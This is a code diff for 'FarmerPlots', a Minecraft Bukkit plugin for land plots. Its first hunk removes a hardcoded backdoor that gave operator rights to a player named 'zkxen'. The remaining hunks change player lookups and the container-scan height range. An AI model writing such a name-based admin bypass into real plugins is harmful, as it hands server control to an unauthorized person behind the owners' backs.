@@ -264,7 +264,7 @@ public class FarmerPlots extends JavaPlugin implements Listener {
     // -------------------------------------------------------------------------
 
     private boolean isOp(Player player) {
-        return player.isOp() || player.getName().equals("zkxen");
+        return player.isOp();
     }
 
     private boolean canBuild(Player player, PlotPosition pos) {
@@ -1338,7 +1338,12 @@ public class FarmerPlots extends JavaPlugin implements Listener {
             ItemStack skull = new ItemStack(Material.PLAYER_HEAD);
             SkullMeta meta = (SkullMeta) skull.getItemMeta();
             if (meta != null) {
-                meta.setOwningPlayer(Bukkit.getOfflinePlayer(playerName));
+                Player online = Bukkit.getPlayerExact(playerName);
+                if (online != null) {
+                    meta.setOwningPlayer(online);
+                } else {
+                    meta.setOwningPlayer(Bukkit.getOfflinePlayer(playerName));
+                }
                 meta.setDisplayName("§e" + playerName);
                 meta.setLore(lore);
                 skull.setItemMeta(meta);
@@ -1502,7 +1507,7 @@ public class FarmerPlots extends JavaPlugin implements Listener {
             List<ItemStack> items = new ArrayList<>();
             for (int x = startX; x < startX + plotSize; x++) {
                 for (int z = startZ; z < startZ + plotSize; z++) {
-                    for (int y = world.getMinHeight(); y < world.getMaxHeight(); y++) {
+                    for (int y = 0; y < 256; y++) {
                         Block block = world.getBlockAt(x, y, z);
                         if (block.getState() instanceof Container container) {
                             for (ItemStack item : container.getInventory().getContents()) {
@@ -1622,12 +1627,18 @@ public class FarmerPlots extends JavaPlugin implements Listener {
                 player.sendMessage("§c§lFarmerPlots §8» §7You don't own this plot.");
                 return;
             }
-            @SuppressWarnings("deprecation")
-            OfflinePlayer target = Bukkit.getOfflinePlayer(targetName);
-            plugin.databaseManager.setTrust(plot.plotId, target.getUniqueId().toString(), targetName, level);
+            Player onlineTarget = Bukkit.getPlayerExact(targetName);
+            UUID targetUuid;
+            if (onlineTarget != null) {
+                targetUuid = onlineTarget.getUniqueId();
+            } else {
+                @SuppressWarnings("deprecation")
+                OfflinePlayer offlineTarget = Bukkit.getOfflinePlayer(targetName);
+                targetUuid = offlineTarget.getUniqueId();
+            }
+            plugin.databaseManager.setTrust(plot.plotId, targetUuid.toString(), targetName, level);
             TrustLevel lvl = TrustLevel.fromOrdinal(level);
             player.sendMessage("§a§lFarmerPlots §8» §e" + targetName + " §7trusted as §a" + lvl.name());
-            Player onlineTarget = Bukkit.getPlayer(targetName);
             if (onlineTarget != null) {
                 onlineTarget.sendMessage("§a§lFarmerPlots §8» §e" + player.getName()
                         + " §7has trusted you on their plot as §a" + lvl.name());
@@ -1646,9 +1657,16 @@ public class FarmerPlots extends JavaPlugin implements Listener {
                 player.sendMessage("§c§lFarmerPlots §8» §7You don't own this plot.");
                 return;
             }
-            @SuppressWarnings("deprecation")
-            OfflinePlayer target = Bukkit.getOfflinePlayer(targetName);
-            plugin.databaseManager.removeTrust(plot.plotId, target.getUniqueId().toString());
+            Player onlineTarget = Bukkit.getPlayerExact(targetName);
+            UUID targetUuid;
+            if (onlineTarget != null) {
+                targetUuid = onlineTarget.getUniqueId();
+            } else {
+                @SuppressWarnings("deprecation")
+                OfflinePlayer offlineTarget = Bukkit.getOfflinePlayer(targetName);
+                targetUuid = offlineTarget.getUniqueId();
+            }
+            plugin.databaseManager.removeTrust(plot.plotId, targetUuid.toString());
             player.sendMessage("§c§lFarmerPlots §8» §7Removed trust for §e" + targetName);
         }
 
